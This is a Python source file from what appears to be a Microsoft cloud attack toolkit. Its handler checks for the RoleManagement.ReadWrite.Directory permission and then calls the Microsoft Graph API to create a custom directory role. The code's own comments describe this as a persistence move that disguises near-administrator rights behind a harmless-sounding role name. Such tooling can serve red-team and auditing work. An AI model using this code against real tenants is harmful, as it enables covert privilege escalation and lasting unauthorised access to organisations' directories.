from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.rolemanagemantPersistance')


class RolemanagemantPersistance_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "RoleManagement.ReadWrite.Directory" in request.roles:
            logger.info('tid: %s, appid: %s may be vulnerable to role_managemant_persistance vector' % (request.tenantId,request.appId))
            status = False
            attack_name = "RoleManagementRWPersistanceVectors"
            message = ""
            error = "RoleManagementRWPersistanceVectors - failed"
            conf = request.attack_config['roleManagement']
            logger.debug("RoleManagement.ReadWrite.Directory - Allows the app to read and manage the role-based access control (RBAC) settings for your company's directory, without a signed-in user.")
        
            logger.debug("Attack vector - persistence give ourself a role which sounds like something weak (like Globel Reader which is basically Global admin in his permissions).")         
            try:
                create_message_URL = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions"
                message_obj = {
                    "description": conf["newRoleDesc"],
                    "displayName": conf["newRoleName"],
                    "rolePermissions": [{
                        "allowedResourceActions": conf["permissions"]
                    }],
                    "isEnabled": "true"
                }

                result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                if result.status_code == 201:
                        message += "created a custom role \n"
                        status = True
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in RoleManagement_Persistance_Handler function")
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))       
            
        return super().handle(request,responses)
